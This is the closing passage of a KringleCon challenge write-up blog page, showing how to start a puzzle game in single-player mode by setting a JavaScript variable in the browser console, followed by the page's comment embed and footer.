data-lang=fallback>{&#34;single_player&#34;:true}
+</code></pre></div><p>Now we can join the game, click on <code>create new room</code> and type this inside JS console</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>single_player_mode <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>true</span>
+</code></pre></div><p>The game will start immediately with the Computer (player 2) on the right side.
+The js variable and the entire game logic can be found in the file <code>hero.min.js</code></p></div><div class=tags><a href=https://knez.github.io/tags/kringlecon>kringlecon</a></div><div id=comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
+var d=document,s=d.createElement('script');s.async=true;s.src='//'+"hackerfiles"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/knez target=_blank rel=noreferrer><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64C68.418278 72 72 68.418278 72 64V8c0-4.418278-3.581721999999999-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64C541083001e-24 68.418278 3.581722 72 8 72z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644 12 47.7406712 18.876 56.7718301 28.4145 59.9584121 29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482 23.343 56.1558981 21.9345 51.4693938 21.9345 51.4693938 20.844 48.6864054 19.2705 47.9454799 19.2705 47.9454799 17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943 21.843 46.6503662 23.1105 48.9634994 23.1105 48.9634994 25.2525 52.6455377 28.728 51.5823398 30.096 50.9649018 30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671 20.688 33.2052792 21.6225 31.0547881 23.1585 29.3696344 22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585 23.3925 22.9934585 25.4085 22.3459017 29.9925 25.4632101 31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101 46.5915 22.3459017 48.603 22.9934585 48.603 22.9934585 49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671 51.309 45.0917119 45.6975 47.1292571 40.3515 47.7256117 41.2125 48.4695491 41.9805 49.9393525 41.9805 52.1877301 41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><p class=copyright>© Copyright
+2022
+<span class=split><svg fill="#bbb" width="15" height="15" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15"><path d="M13.91 6.75c-1.17 2.25-4.3 5.31-6.07 6.94-.1903.1718-.4797.1718-.67.0C5.39 12.06 2.26 9 1.09 6.75-1.48 1.8 5-1.5 7.5 3.45 10-1.5 16.48 1.8 13.91 6.75z"/></svg></span>&nbsp;Nikola Knežević</p><p class=powerby>Powered by <a href=http://www.gohugo.io/>Hugo</a> Theme By <a href=https://github.com/nodejh/hugo-theme-cactus-plus>nodejh</a></p></footer></body></html>
